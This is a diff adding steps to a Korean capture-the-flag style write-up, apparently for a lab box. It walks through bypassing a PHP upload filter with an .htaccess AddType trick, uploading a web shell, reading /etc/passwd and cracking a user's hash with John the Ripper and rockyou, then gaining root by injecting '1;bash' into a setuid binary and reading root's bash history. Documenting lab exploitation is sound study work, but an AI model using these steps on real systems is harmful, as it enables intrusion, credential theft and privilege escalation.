@@ -64,20 +64,62 @@
 
 ### 1) 업로드가 가능한 경로
 
+파일 업로드 시 유의미한 경로 발견
+```
+/uploads/~
+```
+
 ***
 
 ### 2) 특정파일의 확장자 확인
 
+.php .phtml .phar 확장자는 모두 차단되었음.
+
+```
+AddType application/x-httpd-php .abc .txt .xyz
+```
+상대 서버 /var/www/html 경로 내에 .htaccess 파일 전송 후
+
+위 3개의 확장자 중 하나로 php 코드 전송
+
 ***
+
 ### 3) 웹 쉘 업로드 및 파일 확인
 
+웹 쉘이 사용가능하고, find 명령어를 통해 파일의 위치를 확인.
+```
+find / -name flag*
+```
+
 ***
+
 ### 4) 서버 특정 사용자 패스워드 획득
 
+```
+cat /etc/passwd
+```
+ems 계정의 해시 함수로 암호화된 비밀번호 획득
+
+test.txt 파일에 복사한 후, 
+```
+john test.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+입력하여 
+```
+john --show test.txt
+```
+크래킹하여 패스워드 평문 확인
+
 ***
+
 ### 5) 서버 내 setuid 적용된 파일 확인
 
+```
+ssh ems@ip주소
+```
+
 SSH 접속 후, dumb shell을 bash shell로 전환
+
 ```
 /bin/bash
 ```
@@ -87,12 +129,35 @@ SSH 접속 후, dumb shell을 bash shell로 전환
 2>/dev/null
 ```
 
+find 명령어로 setuid 적용된 파일 확인
+```
+find / -perm 4000 2>/dev/null
+```
+
 ***
+
 ### 6) root 권한 획득
 
+```
+./Sub_pro
+```
+
+파일 실행시 Command Injection 공격 수행
+
+```
+1;bash
+```
+
+root 계정으로 bash shell 획득.
 
 ***
-### 7) 
+### 7) root 계정으로 실행했던 bash history 확인
+
+root 디렉토리 하위의 .bash_history 파일 확인
+
+```
+cat /root/.bash_history
+```
 
 ***
 
